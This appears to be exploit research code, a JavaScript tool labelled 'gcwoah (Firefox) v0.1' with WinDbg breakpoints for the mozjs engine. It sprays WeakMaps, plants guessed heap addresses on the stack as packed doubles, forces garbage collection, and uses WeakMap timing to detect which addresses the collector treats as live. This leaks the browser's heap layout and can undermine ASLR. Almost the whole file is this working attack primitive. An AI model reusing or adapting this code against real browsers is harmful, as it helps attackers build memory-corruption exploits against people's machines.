//
/*
bp mozjs + BF740 ".printf \"js::GCCycle()\\n\"; g"
bp mozjs + 10E12A ".if (poi(@esi) == 0x41414141) { .printf \"Found magic on stack!\\n\"; } .else { g; }"
*/
//


var GCWoah = (function() {
    var my = {},
        logf = function(msg) {},
        weaks = new WeakMap(),
        strongs = [],
        permStrongs = [],
        canaryCount = 8,
        canaryMaps = [],
        canaryMapTarget = 49153;

    function toggle_gc() {
        var arr = [];
        for (var i = 0; i < 100000; i++) {
            arr[i] = new Array();
        }
        return arr;
    }

    var canaryStrong = [];
    function primeGCDetector(idx) {
        var k = 49153 - 2;
        var obj;

        while(k > 0) {
            obj = new Object();
            canaryStrong.push(obj);
            canaryMaps[idx].set(obj, k);
            k-= 1;
        }
    }

    function forceGC(idx) {
        canaryStrong = [];
        //primeGCDetector(idx);

        toggle_gc();

        /*
        var i = 0x8000;
        var s = 'AAAA';
        while(i > 0) {
            if (gcSwitch == 0) {
                s = new Array();
            } else if (gcSwitch == 1) {
                s = s[0] + '333333333333333333' + i;
            }
            i -= 1;
        }
        */

        var start, end;

        var obj = new Object();
        canaryStrong.push(obj);
        start = Date.now();
        canaryMaps[idx].set(obj, 0);
        end = Date.now();
        var elapsed1 = end - start;

        obj = new Object();
        canaryStrong.push(obj);
        start = Date.now();
        canaryMaps[idx].set(obj, 0);
        end = Date.now();
        var elapsed2 = end - start;

        return [elapsed1, elapsed2];
    }

    function createObject(id) {
        var obj = {};
        obj["woah"] = id;
        return obj;
    }

    // 393217, 36, 524288
    // 786433, 86, 1048576

    // For WeakMap size inference
    var hashHeadroom = 1;
    var hashTargetEntries = 196609;
    //var hashTarget2Entries = 786433;
    var objsPerTrial = 0x4000;
    var hashPrepackEntries = hashTargetEntries - hashHeadroom - objsPerTrial;
    var tempStrong = [];


    function countWeaks() {
        var added = 0;
        var i = hashTargetEntries + objsPerTrial + 1;
        var spikeMillis = 0;
        var spikeWhen = 0;
        var obj;

        // Trigger re-pack of the hash table
        obj = new Object();
        tempStrong.push(obj);
        weaks.set(obj, i);

        while(i > 0) {
            var obj = new Object();

            tempStrong.push(obj);
            var start = Date.now();
            weaks.set(obj, i);
            var end = Date.now();
            var elapsed = end - start;

            added += 1;
            if (elapsed > spikeMillis) {
                spikeMillis = elapsed;
                spikeWhen = added;
            }

            i -= 1;
        }

        return (hashTargetEntries - 1 + objsPerTrial) - spikeWhen;
    }

    function prepackWeaks(count, cb) {
        var i = count;

        var worker = function() {
            var added = 0;

            while(i > 0) {
                var obj = {};
                obj["woah"] = -1;
                permStrongs.push(obj);
                weaks.set(obj, i);
                if (i <= (canaryMapTarget - 2)) {
                    var ccount = canaryCount;
                    while(ccount > 0) {
                        canaryMaps[ccount - 1].set(obj, true);
                        ccount -= 1;
                    }
                }
                i -= 1;
                added += 1;

                if (added % 0x1000 == 0) {
                    setTimeout(worker, 10);
                    return;
                }
            }

            cb();
        }

        worker();
    }

    function populateWeaks(f, cb) {
        var count = objsPerTrial;

        var worker = function() {
            while(count > 0) {
                var obj = f(count);
                weaks.set(obj, count);
                strongs.push(obj);

                if (count <= canaryCount) {
                    canaryMaps[count - 1].set(obj, count - 1);
                }

                count -= 1;
            }

            obj = {};

            cb();
        };

        weaks = new WeakMap();
        strongs = [];
        canaryMaps = [];
        var ccount = canaryCount;
        while(ccount > 0) {
            canaryMaps[ccount - 1] = new WeakMap();
            ccount -= 1;
        }
        prepackWeaks(hashPrepackEntries, worker);
    }

    function populateStack(
            dbl0, dbl1, 
            dbl2, dbl3, 
            dbl4, dbl5, 
            dbl6, dbl7, 
            dbl8, dbl9, 
            dbl10, dbl11, 
            dbl12, dbl13, 
            dbl14, dbl15) {
        //logf('[+] Stack populated ' + 
        //    (dbl0 + dbl1 + dbl2 + dbl3 + dbl4 + dbl5 + dbl6 + dbl7 +
        //        dbl8 + dbl9 + dbl10 + dbl11 + dbl12 + dbl13 + dbl14 + dbl15));

        strongs = new Array();
        strongs.push((dbl0 + dbl1 + dbl2 + dbl3 + dbl4 + dbl5 + dbl6 + dbl7 + 
            dbl8 + dbl9 + dbl10 + dbl11 + dbl12 + dbl13 + dbl14 + dbl15));

        var tries = 8;
        var weaksCount;

        while(tries > 0) {
            var gced = forceGC(tries - 1);
            //logf('[+] forceGC(): ' + gced);
            if (gced[1] > 1) break;

            tries -= 1;
        }

        weaksCount = countWeaks();

        if (tries == 0 && weaksCount == objsPerTrial) {
            logf('[+] After populating stack, weaks.length is ' + weaksCount.toString());
            logf('[+] Failed triggering the GC :/');
            return 1;
        } else {
            logf('[+] After populating stack, weaks.length is ' + weaksCount.toString());
            if (weaksCount == 1 || weaksCount == 2) {
                return 0;
            } else {
                return 2;
            }
        }

        //logf('[+] Stack being unpopulated');
    }

    function benchmarkWeakMapTiming() {
        var added = 0;
        var i = 0x100000;
        var tempStrong = [];

        var worker = function() {
            while(i > 0) {
                var obj = new Object();

                tempStrong.push(obj);
                var start = Date.now();
                weaks.set(obj, i);
                var end = Date.now();
                var elapsed = end - start;

                added += 1;
                if (elapsed > 1) {
                    logf(' ' + added + ', ' + elapsed + ', ' + ((added - 1) * 100 / 75) );
                }
                i -= 1;

                if (added % 0x1000 == 0) {
                    setTimeout(worker, 20);
                    return;
                }
            }
        }

        worker();
    }

    my.setLoggingFunction = function(f) { logf = f; };

    function packDouble(hi, lo) {
        var p32 = 0x100000000;
        var p52 = 0x10000000000000;

        var exp = (hi >> 20) & 0x7ff;
        var sign = (hi >> 31);
        var m = 1 + ((hi & 0xfffff) * p32 + lo) / p52;
        m = exp ? (m + 1) : (m * 2.0);

        return (sign ? -1 : 1) * m * Math.pow(2, exp - 1023);
    }

    my.scanForHeapObject = function() {
        logf('gcwoah (Firefox) v0.1');

        var base = 0x02000000;
        var pageDelta = 0x00010000;
        var pagesPerTick = 1;
        var pageOffset1 = 0x80;
        var pageOffset2 = 0xc0;
        var baseTrials = 8;
        var baseTrialCount = 8;

        //benchmarkWeakMapTiming();
        var doTick = function() {
            logf('[+] Scanning with base ' + base.toString(16));

            var dbl0 = packDouble(base + (0 * pageDelta) + pageOffset1, base + (0 * pageDelta) + pageOffset2);
            var dbl1 = packDouble(base + (1 * pageDelta) + pageOffset1, base + (1 * pageDelta) + pageOffset2);
            var dbl2 = packDouble(base + (2 * pageDelta) + pageOffset1, base + (2 * pageDelta) + pageOffset2);
            var dbl3 = packDouble(base + (3 * pageDelta) + pageOffset1, base + (3 * pageDelta) + pageOffset2);
            var dbl4 = packDouble(base + (4 * pageDelta) + pageOffset1, base + (4 * pageDelta) + pageOffset2);
            var dbl5 = packDouble(base + (5 * pageDelta) + pageOffset1, base + (5 * pageDelta) + pageOffset2);
            var dbl6 = packDouble(base + (6 * pageDelta) + pageOffset1, base + (6 * pageDelta) + pageOffset2);
            var dbl7 = packDouble(base + (7 * pageDelta) + pageOffset1, base + (7 * pageDelta) + pageOffset2);
            var dbl8 = packDouble(base + (8 * pageDelta) + pageOffset1, base + (8 * pageDelta) + pageOffset2);
            var dbl9 = packDouble(base + (9 * pageDelta) + pageOffset1, base + (9 * pageDelta) + pageOffset2);
            var dbl10 = packDouble(base + (10 * pageDelta) + pageOffset1, base + (10 * pageDelta) + pageOffset2);
            var dbl11 = packDouble(base + (11 * pageDelta) + pageOffset1, base + (11 * pageDelta) + pageOffset2);
            var dbl12 = packDouble(base + (12 * pageDelta) + pageOffset1, base + (12 * pageDelta) + pageOffset2);
            var dbl13 = packDouble(base + (13 * pageDelta) + pageOffset1, base + (13 * pageDelta) + pageOffset2);
            var dbl14 = packDouble(base + (14 * pageDelta) + pageOffset1, base + (14 * pageDelta) + pageOffset2);
            var dbl15 = packDouble(base + (15 * pageDelta) + pageOffset1, base + (15 * pageDelta) + pageOffset2);

            populateWeaks(createObject, function() {
                    var rv = populateStack(
                        dbl0, dbl0, 
                        dbl0, dbl0, 
                        dbl0, dbl0, 
                        dbl0, dbl0, 
                        dbl0, dbl0, 
                        dbl0, dbl0, 
                        dbl0, dbl0, 
                        dbl0, dbl0);
                    if (rv == 0) {
                        logf("Win! " + base.toString(16));
                    } else if (rv == 1) {
                        setTimeout(doTick, 10);
                    } else {
                        baseTrials -= 1;
                        if (baseTrials <= 0) {
                            base += pageDelta * pagesPerTick;
                            baseTrials = baseTrialCount;
                        }
                        setTimeout(doTick, 10);
                    }
                });

        }

        setTimeout(doTick, 10);
    };

    return my;
}());